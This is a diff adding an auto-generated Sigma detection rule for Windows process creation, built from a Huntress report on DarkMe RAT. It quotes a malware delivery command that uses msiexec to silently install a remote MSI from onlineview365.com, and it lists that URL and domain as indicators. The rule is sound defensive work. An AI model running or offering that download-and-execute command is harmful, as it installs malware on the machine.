@@ -1,0 +1,37 @@
+title: 'Command the source shows being run: msiexec /i https://onlineview365.com/propi.msi'
+id: 831faaec-f1de-418c-8563-8569d3de08dd
+status: experimental
+description: 'Deterministic rule built from a command quoted in the primary source, with no model involvement.
+  The source shows this command being run: "msiexec /i https://onlineview365.com/propi.msi /quiet /norestart`
+  Fetching a remote MSI over HTTPS with `/quiet`".'
+references:
+- https://www.huntress.com/blog/darkme-rat-abandons-exploits
+author: hecate (auto-generated from commands quoted in the source - requires analyst review)
+date: '2026-10-12'
+tags:
+- attack.t1218.007
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: \msiexec.exe
+    CommandLine|contains: /i https://onlineview365.com/propi.msi
+  condition: selection
+falsepositives:
+- Administrators or software running the same command for legitimate reasons
+level: medium
+hecate_provenance:
+- value: https://onlineview365.com/propi.msi
+  type: url
+  role: delivery
+  status: unknown
+  confidence: unknown
+  source: cti
+- value: onlineview365.com
+  type: domain
+  role: delivery
+  status: unknown
+  confidence: unknown
+  source: cti
+hunt_id: H-0718
